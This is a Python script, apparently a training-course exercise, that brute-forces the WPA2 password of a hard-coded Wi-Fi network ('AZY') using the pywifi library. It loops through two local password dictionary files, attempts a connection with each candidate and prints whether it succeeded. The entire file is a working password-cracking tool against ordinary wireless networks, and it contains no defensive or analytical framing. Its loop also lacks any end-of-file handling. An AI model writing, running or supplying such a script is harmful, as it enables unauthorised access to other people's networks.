import time
import multiprocessing
import pywifi
from pywifi import const
import os


def test_wifi_connect(password_str):
	wifi = pywifi.PyWiFi()  # 开启一个无线对象
	interface = wifi.interfaces()[0]  # 抓取无线网卡列表第一个无线网卡
	# print(wifi.interfaces())
	# print(interface.name())  # 取出无限网卡的名字

	interface.disconnect()  # 断开无线网卡连接
	time.sleep(3)  # 断开以后缓冲3秒

	profile = pywifi.Profile()  # 配置文件
	profile.ssid = "AZY"  # 就是wifi名称
	profile.auth = const.AUTH_ALG_OPEN  # 需要密码链接
	profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
	profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
	profile.key = password_str  # 测试密码成功或者失败

	interface.remove_all_network_profiles()  # 删除其他所有配置文件
	tmp_profile = interface.add_network_profile(profile)  # 加载配置文件

	interface.connect(tmp_profile)  # 连接
	time.sleep(5)  # 5秒内看是否可以链接上。
	isok = False  # 标识连接成功状态,初值为连接失败

	if interface.status() == const.IFACE_CONNECTED:  # 连接成功
		isok = True
		print("%s 连接成功,密码是:%s,进程id是:%s" % (profile.ssid, password_str, os.getpid()))
	else:
		print("%s 连接失败,密码是:%s,进程id是:%s" % (profile.ssid, password_str, os.getpid()))

	interface.disconnect()  # 断开连接
	time.sleep(1)
	return isok


if __name__ == '__main__':
	file_path1 = r"F:\黑马Python21期基础班\Crack_Wifi\8位以上密码字典.txt"
	file_path2 = r"F:\黑马Python21期基础班\破解wifi版本2\pass.txt"
	# get_line(file_path1)
	# get_line(file_path2)
	# open(file_path2, 'r') as f2
	with open(file_path1, 'r') as f1,open(file_path2, 'r') as f2:
		while True:
			passed1 = f1.readline().strip()
			passed2 = f2.readline().strip()

			pool = multiprocessing.Pool(2)
			pool.apply(test_wifi_connect, args=(passed1,))
			pool.apply(test_wifi_connect, args=(passed2,))
			pool.close()
			pool.join()
